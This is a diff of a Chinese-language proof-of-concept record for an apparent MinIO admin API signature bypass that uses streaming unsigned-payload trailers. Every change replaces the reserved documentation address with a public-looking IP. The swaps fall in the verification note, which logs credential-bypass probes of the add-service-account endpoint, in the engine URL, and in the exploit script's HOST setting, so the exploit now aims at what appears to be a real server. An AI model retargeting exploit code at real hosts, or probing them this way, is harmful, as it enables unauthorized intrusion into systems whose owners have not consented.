@@ -9,11 +9,11 @@
 - **language**: markdown
 - **source**: manual
 - **verified**: 1
-- **verified_note**: 2026-11-03 由 work(i7573) 在 192.0.2.15:9000（Server: MinIO，部署模式 mode-server-xl-single，由响应体泄露）以 python + raw socket 直连、无代理实测。同一 PUT /minio/admin/v3/add-service-account 只改凭据部分，三种形态（真 AK+随机签名 / 不存在的 AK artxnosuchak / 完全删除 Authorization 头）回显逐字节一致，全部 403 {"Code":"AccessDenied","Resource":"/minio/admin/v3/add-service-account"}；对照：GET 同路径 403 SignatureDoesNotMatch、POST 同路径 426 XMinioAdminVersionMismatch；对象面校准：普通签名 PUT 新桶 SignatureDoesNotMatch，只改 streaming 头则 AccessDenied + <BucketName>。据此判定签名层与 AK 存在性校验均被跳过、请求已进入 admin handler。定 low 的原因：mode-server-xl-single 下绝大多数 admin 路由未注册（426），且 AccessDenied 表示过不了 IAM 权限闸，本实例尚未拿到桶清单/服务账号。原始回显留存于 D:/ARTEX/data/tasks/612/i7573/raw.log、resp.log，脚本 admin_probe.py / probe4.py。
+- **verified_note**: 2026-11-03 由 work(i7573) 在 23.147.148.253:9000（Server: MinIO，部署模式 mode-server-xl-single，由响应体泄露）以 python + raw socket 直连、无代理实测。同一 PUT /minio/admin/v3/add-service-account 只改凭据部分，三种形态（真 AK+随机签名 / 不存在的 AK artxnosuchak / 完全删除 Authorization 头）回显逐字节一致，全部 403 {"Code":"AccessDenied","Resource":"/minio/admin/v3/add-service-account"}；对照：GET 同路径 403 SignatureDoesNotMatch、POST 同路径 426 XMinioAdminVersionMismatch；对象面校准：普通签名 PUT 新桶 SignatureDoesNotMatch，只改 streaming 头则 AccessDenied + <BucketName>。据此判定签名层与 AK 存在性校验均被跳过、请求已进入 admin handler。定 low 的原因：mode-server-xl-single 下绝大多数 admin 路由未注册（426），且 AccessDenied 表示过不了 IAM 权限闸，本实例尚未拿到桶清单/服务账号。原始回显留存于 D:/ARTEX/data/tasks/612/i7573/raw.log、resp.log，脚本 admin_probe.py / probe4.py。
 - **path**: pocs/minio-admin-v3-streaming-unsigned-payload-trailer-bypass-cve/minio_admin_v3_streaming_bypass.md
 - **tags**: minio,admin v3,admin api,sigv4,aws-chunked,streaming-unsigned-payload-trailer,cve-2026-41145,签名绕过,无需授权头,add-service-account,add-user
 - **created_at**: 2026-11-02T17:14:12.615Z
-- **engine**: http://192.0.2.15:9000/minio/admin/v3/
+- **engine**: http://23.147.148.253:9000/minio/admin/v3/
 - **found_by**: vuln-scan
 
 ## 描述
@@ -109,7 +109,7 @@ d\r\n{"policy":""}\r\n0\r\nx-amz-checksum-crc32:<base64(crc32(body))>\r\n\r\n
 ```python
 import http.client, hashlib, hmac, base64, zlib, datetime, random, time
 
-HOST, PORT = '192.0.2.15', 9000
+HOST, PORT = '23.147.148.253', 9000
 REGION, SERVICE = 'us-east-1', 's3'
 ts = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
 stamp = ts[:8]
